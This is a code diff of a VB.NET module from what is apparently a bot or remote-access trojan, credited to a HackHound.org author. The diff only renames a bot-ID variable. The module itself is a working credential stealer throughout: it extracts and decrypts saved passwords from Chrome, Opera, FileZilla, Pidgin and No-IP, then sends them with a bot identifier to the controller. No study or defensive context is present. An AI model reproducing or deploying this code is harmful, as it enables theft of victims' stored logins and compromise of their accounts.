@@ -7,7 +7,6 @@ Imports System.Xml
 Module PWD
     ' credit Rottweiler @ HackHound.org
     Public Passwrods As String
-    Public HW = ID.Bot
 
 
     Public Sub Begin()
@@ -17,7 +16,7 @@ Module PWD
         RecoverFileZilla()
         NO_IP()
 
-        Main.Send("PWD+" + Main.SPL + Passwrods + Main.SPL + HW)
+        Main.Send("PWD+" + Main.SPL + Passwrods + Main.SPL + Main.BOT)
         Passwrods = Nothing
 
         Threading.Thread.CurrentThread.Sleep(10000)
@@ -41,7 +40,7 @@ Module PWD
                     user = SQLDatabase.GetValue(i, "username_value")
                     pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))
                     If (user <> "") And (pass <> "") Then
-                        Passwrods += vbNewLine & "~|~NAME~|~ " & HW & vbNewLine & "~|~Application~|~ " & "Chrome" & vbNewLine & "~|~URL~|~ " & URLC & vbNewLine & "~|~USR~|~ " & user & vbNewLine & "~|~PWD~|~ " & pass & vbNewLine
+                        Passwrods += vbNewLine & "~|~NAME~|~ " & Main.BOT & vbNewLine & "~|~Application~|~ " & "Chrome" & vbNewLine & "~|~URL~|~ " & URLC & vbNewLine & "~|~USR~|~ " & user & vbNewLine & "~|~PWD~|~ " & pass & vbNewLine
                     End If
                 Next
             End If
@@ -61,7 +60,7 @@ Module PWD
                     Dim password_crypted As String = sql.GetValue(i, "password_value")
                     Dim password As String = IIf(String.IsNullOrEmpty(password_crypted), "", Decrypt(Encoding.Default.GetBytes(password_crypted)))
                     If (username <> "") And (password <> "") Then
-                        Passwrods += vbNewLine & "~|~NAME~|~ " & HW & vbNewLine & "~|~Application~|~ " & "Opera" & vbNewLine & "~|~URL~|~ " & url & vbNewLine & "~|~USR~|~ " & username & vbNewLine & "~|~PWD~|~ " & password & vbNewLine
+                        Passwrods += vbNewLine & "~|~NAME~|~ " & Main.BOT & vbNewLine & "~|~Application~|~ " & "Opera" & vbNewLine & "~|~URL~|~ " & url & vbNewLine & "~|~USR~|~ " & username & vbNewLine & "~|~PWD~|~ " & password & vbNewLine
                     End If
                 Next
             End If
@@ -78,7 +77,7 @@ Module PWD
                     Dim Username As String = ExtractValue(Node, "name")
                     Dim Password As String = ExtractValue(Node, "password")
                     If (Username <> "") And (Password <> "") Then
-                        Passwrods += vbNewLine & "~|~NAME~|~ " & HW & vbNewLine & "~|~Application~|~ " & "Pidgin" & vbNewLine & "~|~URL~|~ " & Domain & vbNewLine & "~|~USR~|~ " & Username & vbNewLine & "~|~PWD~|~ " & Password & vbNewLine
+                        Passwrods += vbNewLine & "~|~NAME~|~ " & Main.BOT & vbNewLine & "~|~Application~|~ " & "Pidgin" & vbNewLine & "~|~URL~|~ " & Domain & vbNewLine & "~|~USR~|~ " & Username & vbNewLine & "~|~PWD~|~ " & Password & vbNewLine
                     End If
                 Next
             End If
@@ -94,7 +93,7 @@ Module PWD
                 Dim user As String = ExtractValue(Node, "User")
                 Dim pass As String = ExtractValue(Node, "Pass", (Node.SelectSingleNode("Pass[@encoding='base64']") IsNot Nothing))
                 If (user <> "") And (pass <> "") Then
-                    Passwrods += vbNewLine & "~|~NAME~|~ " & HW & vbNewLine & "~|~Application~|~ " & "Pidgin" & vbNewLine & "~|~URL~|~ " & Host & vbNewLine & "~|~USR~|~ " & user & vbNewLine & "~|~PWD~|~ " & pass & vbNewLine
+                    Passwrods += vbNewLine & "~|~NAME~|~ " & Main.BOT & vbNewLine & "~|~Application~|~ " & "Pidgin" & vbNewLine & "~|~URL~|~ " & Host & vbNewLine & "~|~USR~|~ " & user & vbNewLine & "~|~PWD~|~ " & pass & vbNewLine
                 End If
             Next
         Catch : End Try
@@ -109,13 +108,13 @@ Module PWD
         Dim Password As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Vitalwerks\DUC", "Password", Nothing)
         If Environment.GetFolderPath(38).Contains("x86") Then
             If (User <> "") And (Password <> "") Then
-                Passwrods += vbNewLine & "~|~NAME~|~ " & HW & vbNewLine & "~|~Application~|~ " & "NO-IP" & vbNewLine & "~|~URL~|~ " & User & vbNewLine & "~|~USR~|~ " & User & vbNewLine & "~|~PWD~|~ " & Decode(Password) & vbNewLine
+                Passwrods += vbNewLine & "~|~NAME~|~ " & Main.BOT & vbNewLine & "~|~Application~|~ " & "NO-IP" & vbNewLine & "~|~URL~|~ " & User & vbNewLine & "~|~USR~|~ " & User & vbNewLine & "~|~PWD~|~ " & Decode(Password) & vbNewLine
             End If
         Else
             PathNN = PathNN.Replace("\Wow6432Node", "")
             PathNN = PathNN.Replace("\Wow6432Node", "")
             If (User <> "") And (Password <> "") Then
-                Passwrods += vbNewLine & "~|~NAME~|~ " & HW & vbNewLine & "~|~Application~|~ " & "NO-IP" & vbNewLine & "~|~URL~|~ " & "https://www.noip.com" & vbNewLine & "~|~USR~|~ " & User & vbNewLine & "~|~PWD~|~ " & Decode(Password) & vbNewLine
+                Passwrods += vbNewLine & "~|~NAME~|~ " & Main.BOT & vbNewLine & "~|~Application~|~ " & "NO-IP" & vbNewLine & "~|~URL~|~ " & "https://www.noip.com" & vbNewLine & "~|~USR~|~ " & User & vbNewLine & "~|~PWD~|~ " & Decode(Password) & vbNewLine
             End If
         End If
     End Sub
